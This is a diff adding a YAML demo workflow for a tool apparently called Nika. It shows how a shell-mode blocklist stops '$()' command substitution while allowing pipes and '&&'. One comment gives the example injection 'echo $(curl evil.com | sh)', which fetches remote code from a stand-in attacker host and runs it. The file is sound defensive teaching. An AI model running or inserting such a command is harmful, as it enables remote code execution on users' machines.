@@ -1,0 +1,64 @@
+# =============================================================================
+# SECURITY DEMO 02: Shell Mode Security
+# =============================================================================
+#
+# Nika's exec: verb has TWO execution modes:
+#   - shell: false (default) — uses shlex tokenization, no shell features
+#   - shell: true            — passes command to /bin/sh -c
+#
+# In shell-free mode, characters like $(), backticks, pipes, and semicolons
+# are treated as literal text — no shell injection possible.
+#
+# When shell: true is enabled, an ADDITIONAL blocklist activates that blocks
+# command substitution patterns: $() and backticks.
+#
+# DEMONSTRATES:
+#   - shell: false prevents injection by design (no shell interpretation)
+#   - shell: true with safe commands works fine
+#   - shell: true with $() triggers NIKA-053 (shell-mode blocklist)
+#   - Security layers are additive: base blocklist + shell-mode blocklist
+#
+# EXPECTED BEHAVIOR:
+#   "shell_free_safe"    succeeds -> $() is literal text, not executed
+#   "shell_true_safe"    succeeds -> safe shell commands pass
+#   "shell_true_chain"   succeeds -> pipes and && are allowed (not on blocklist)
+#   "shell_substitution" FAILS    -> NIKA-053: $() blocked in shell mode
+#
+# RUN: nika run 02-shell-mode-security.nika.yaml
+# =============================================================================
+
+schema: "nika/workflow@0.12"
+
+workflow: security-shell-mode
+
+tasks:
+  # Shell-free mode (default): $() is NOT interpreted by a shell.
+  # The literal string "$(whoami)" is echoed, not executed.
+  - id: shell_free_safe
+    exec:
+      command: "echo 'Literal dollar-paren: $(whoami) is not executed'"
+      shell: false
+
+  # Shell mode with safe commands — pipes and chaining are fine
+  - id: shell_true_safe
+    depends_on: [shell_free_safe]
+    exec:
+      command: "echo 'Safe shell mode' && date '+%Y-%m-%d %H:%M:%S'"
+      shell: true
+
+  # Shell mode with pipe chain — allowed because pipe-to-echo is not on blocklist
+  - id: shell_true_chain
+    depends_on: [shell_true_safe]
+    exec:
+      command: "echo 'hello world' | tr 'a-z' 'A-Z'"
+      shell: true
+
+  # BLOCKED: $() command substitution in shell mode
+  # In shell: true, the shell-mode blocklist catches $() to prevent
+  # injection like exec: "echo $(curl evil.com | sh)"
+  # This triggers NIKA-053
+  - id: shell_substitution
+    depends_on: [shell_true_chain]
+    exec:
+      command: "echo $(whoami)"
+      shell: true
